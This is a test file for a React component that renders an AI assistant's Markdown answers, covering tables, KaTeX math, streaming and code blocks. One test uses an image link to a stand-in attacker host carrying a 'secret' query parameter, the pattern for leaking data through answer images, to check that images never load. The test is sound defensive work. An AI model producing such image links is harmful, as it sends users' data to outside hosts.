import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const shell = vi.hoisted(() => ({ open: vi.fn() }));
vi.mock("@tauri-apps/plugin-shell", () => shell);

import { AnswerMarkdown } from "./AnswerMarkdown";
import FIXTURE from "../../harness/fixtures/answer.md?raw";
import FIXTURE_MORE from "../../harness/fixtures/answer-more.md?raw";

beforeEach(() => shell.open.mockReset());
afterEach(() => cleanup());

describe("AnswerMarkdown", () => {
  it("renders Markdown in one wrapper that carries the stable class, the caller's classes and style", () => {
    const { container } = render(
      <AnswerMarkdown content={"# Plan\n\nShip **today**."} className="prose leading-relaxed" style={{ fontSize: "14px" }} />,
    );
    const wrapper = container.firstElementChild as HTMLElement;
    expect(container.children).toHaveLength(1);
    expect(wrapper.tagName).toBe("DIV");
    expect(wrapper.className).toBe("answer-md prose leading-relaxed");
    expect(wrapper.style.fontSize).toBe("14px");
    expect(wrapper.querySelector("h1")).toHaveTextContent("Plan");
    expect(wrapper.querySelector("strong")).toHaveTextContent("today");
  });

  it("has only the stable class when the caller passes none", () => {
    const { container } = render(<AnswerMarkdown content="Hello" />);
    expect((container.firstElementChild as HTMLElement).className).toBe("answer-md");
  });

  it("understands GitHub-flavoured Markdown: tables, strikethrough and task lists", () => {
    const { container } = render(
      <AnswerMarkdown content={"| Step | Owner |\n| --- | --- |\n| Deploy | Ana |\n\n~~old~~\n\n- [x] done"} />,
    );
    expect(container.querySelectorAll("table tbody tr")).toHaveLength(1);
    expect(container.querySelector("th")).toHaveTextContent("Step");
    expect(container.querySelector("del")).toHaveTextContent("old");
    expect(container.querySelector('input[type="checkbox"]')).toBeChecked();
  });

  it("never loads an image, also when the caller's overrides ask for one", () => {
    const { container } = render(
      <AnswerMarkdown
        content={"before ![chart](https://evil.test/p.png?q=secret) after"}
        components={{ img: (props) => <img {...props} /> }}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[Image: chart]");
    expect(container.innerHTML).not.toContain("evil.test");
  });

  it("holds a link back until the user confirms it", () => {
    render(<AnswerMarkdown content="See [the report](https://example.com/report)" />);
    const stays = fireEvent.click(screen.getByRole("link", { name: "the report" }));
    expect(stays, "the click's own navigation is cancelled").toBe(false);
    expect(shell.open).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole("button", { name: "Open link" }));
    expect(shell.open).toHaveBeenCalledExactlyOnceWith("https://example.com/report");
  });

  it("keeps the caller's other element overrides", () => {
    const { container } = render(
      <AnswerMarkdown content={"# Title\n\ntext"} components={{ h1: ({ children }) => <h3 data-site>{children}</h3> }} />,
    );
    expect(container.querySelector("h1")).toBeNull();
    expect(container.querySelector("h3[data-site]")).toHaveTextContent("Title");
  });

  it("renders the same while the text is still streaming", () => {
    const content = "Half an ans";
    const done = render(<AnswerMarkdown content={content} />).container.innerHTML;
    cleanup();
    const streaming = render(<AnswerMarkdown content={content} streaming />).container.innerHTML;
    expect(streaming).toBe(done);
  });

  it("renders a long answer cut into blocks while streaming exactly as the whole answer", () => {
    const content = [FIXTURE, FIXTURE_MORE].join("\n");
    // Only the line breaks between top-level elements may differ: they render as nothing.
    const html = (streaming: boolean) =>
      render(<AnswerMarkdown content={content} streaming={streaming} />).container.innerHTML.replace(/>\n+</g, "><");
    const done = html(false);
    cleanup();
    expect(html(true)).toBe(done);
    expect(done).toContain("katex-display");
  });

  it("nests lists as written", () => {
    const { container } = render(
      <AnswerMarkdown content={"1. Read\n2. Refill\n   - elapsed\n   - level\n     - never above\n     - never below\n3. Take"} />,
    );
    const outer = container.querySelector(".answer-md > ol")!;
    expect(outer.children).toHaveLength(3);
    const inner = outer.children[1].querySelector(":scope > ul")!;
    expect(inner.children).toHaveLength(2);
    expect(inner.children[1].querySelectorAll(":scope > ul > li")).toHaveLength(2);
  });

  it("puts a table in a box that scrolls sideways, with a header row and body rows", () => {
    const { container } = render(<AnswerMarkdown content={"| A | B |\n| --- | --- |\n| 1 | 2 |\n| 3 | 4 |"} />);
    const table = container.querySelector(".answer-md-table > table")!;
    expect(table.querySelectorAll("thead th")).toHaveLength(2);
    expect(table.querySelectorAll("tbody tr")).toHaveLength(2);
    expect(table.querySelectorAll("tbody td")[3]).toHaveTextContent("4");
  });

  it("renders \\( … \\) and \\[ … \\] with KaTeX, inline and as a display block", () => {
    const { container } = render(<AnswerMarkdown content={"Rate \\( r \\) per second.\n\n\\[\nN = B + r \\cdot T\n\\]"} />);
    const inline = container.querySelector("p .katex");
    expect(inline).not.toBeNull();
    expect(inline!.closest(".katex-display")).toBeNull();
    expect(container.querySelector(".katex-display .katex")).not.toBeNull();
    expect(container.querySelector('.katex-display annotation[encoding="application/x-tex"]')).toHaveTextContent("N = B + r \\cdot T");
    expect(container.textContent).not.toContain("\\(");
  });

  it("leaves amounts of money as text", () => {
    const { container } = render(<AnswerMarkdown content="A plan that costs $5 or $10 a month." />);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toBe("A plan that costs $5 or $10 a month.");
  });

  it.each([
    ["Price is $100 and formula ", "."],
    ["Price is $100.25 and formula (", ")."],
    ["价格是$100，公式为", "。"],
  ])("renders an inline formula after a price in the same paragraph (%#)", (prefix, suffix) => {
    const { container } = render(<AnswerMarkdown content={`${prefix}$x$${suffix}`} />);
    expect(container.querySelector('p .katex annotation[encoding="application/x-tex"]')?.textContent).toBe("x");
    expect(container.querySelector("p")?.firstChild?.textContent).toBe(prefix);
    expect(container.querySelector(".katex-error")).toBeNull();
  });

  it("shows math in code as code", () => {
    const { container } = render(<AnswerMarkdown content={"`\\(x\\)`\n\n```\n\\[ y \\]\n```"} />);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector("p code")).toHaveTextContent("\\(x\\)");
    expect(container.querySelector("pre code")).toHaveTextContent("\\[ y \\]");
  });

  it("shows a formula that is still arriving as typed, then renders it once it closes", () => {
    const { container, rerender } = render(<AnswerMarkdown content={"Then\n\n\\[\nN = B +"} streaming />);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toContain("\\[");
    expect(container.textContent).toContain("N = B +");
    rerender(<AnswerMarkdown content={"Then\n\n\\[\nN = B + r\n\\]"} streaming />);
    expect(container.querySelector(".katex-display")).not.toBeNull();
    expect(container.textContent).not.toContain("\\[");
  });

  it("shows bad LaTeX as its source instead of throwing", () => {
    const { container } = render(<AnswerMarkdown content={"\\( \\frac{1}{ \\)"} />);
    expect(container.textContent).toContain("\\frac{1}{");
  });

  it("preserves echo \"$HOME/$USER\" verbatim in 4-space indented code blocks while rendering prose math", () => {
    const md = 'Run this:\n\n    echo "$HOME/$USER"\n\nWhere $x^2$ and \\( \\pi r^2 \\) apply.';
    for (const streaming of [false, true]) {
      const { container } = render(<AnswerMarkdown content={md} streaming={streaming} />);
      const code = container.querySelector("pre code");
      expect(code).not.toBeNull();
      expect(code!.textContent?.trim()).toBe('echo "$HOME/$USER"');
      expect(code!.querySelector(".katex")).toBeNull();
      expect(container.querySelectorAll("p .katex")).toHaveLength(2);
      cleanup();
    }
  });

  it("preserves echo \"$HOME/$USER\" verbatim in list-marker fenced code blocks while rendering prose math", () => {
    const md = '- ```bash\n  echo "$HOME/$USER"\n  ```\n\nThen \\( a + b \\) and:\n\n\\[\nE = mc^2\n\\]';
    for (const streaming of [false, true]) {
      const { container } = render(<AnswerMarkdown content={md} streaming={streaming} />);
      const code = container.querySelector("li pre code");
      expect(code).not.toBeNull();
      expect(code!.textContent?.trim()).toBe('echo "$HOME/$USER"');
      expect(code!.querySelector(".katex")).toBeNull();
      expect(container.querySelector("p .katex")).not.toBeNull();
      expect(container.querySelector(".katex-display .katex")).not.toBeNull();
      cleanup();
    }
  });
});
